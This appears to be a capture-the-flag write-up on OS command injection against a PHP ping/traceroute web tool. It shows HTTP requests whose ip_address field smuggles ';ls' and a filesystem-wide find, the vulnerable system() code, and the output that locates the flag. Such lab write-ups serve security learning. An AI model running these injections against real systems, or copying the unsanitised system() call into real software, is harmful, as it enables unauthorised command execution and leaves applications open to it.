Looking at the web title it says "rce", and since it is a webtool that seems to execute ping and traceroute commands maybe we can capture the packet and inject some commands.

There is the some method for performing the command execution.

1. By using ; (semicolon)
2. By using | (Or operator)
3. By using & ( ampersand operator )

POST / HTTP/1.1
Host: 142.93.39.188:31539
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 56
Origin: http://142.93.39.188:31539
Connection: close
Referer: http://142.93.39.188:31539/
Upgrade-Insecure-Requests: 1

cmd=ls&test=ping&ip_address=142.93.39.188;ls&submit=Test

With this payload we could see that we get inde.php
Executing the command: cat index.php
We get:

function getUserIp()
{
    return $_SERVER['REMOTE_ADDR'];
}

function runTest($test, $ip_address)
{
    if ($test === 'ping')
    {
        system("ping -c4 ${ip_address}");
    }
    if ($test === 'traceroute')
    {
        system("traceroute ${ip_address}");
    }
}

TO find the flag send the following payload:
cmd=ls&test=ping&ip_address=142.93.39.188;find%20/%20-name%20flag*%202>/dev/null&submit=Test

/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
/proc/sys/kernel/sched_domain/cpu2/domain0/flags
/proc/sys/kernel/sched_domain/cpu3/domain0/flags
/sys/devices/pnp0/00:00/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/flag_sZhDJ


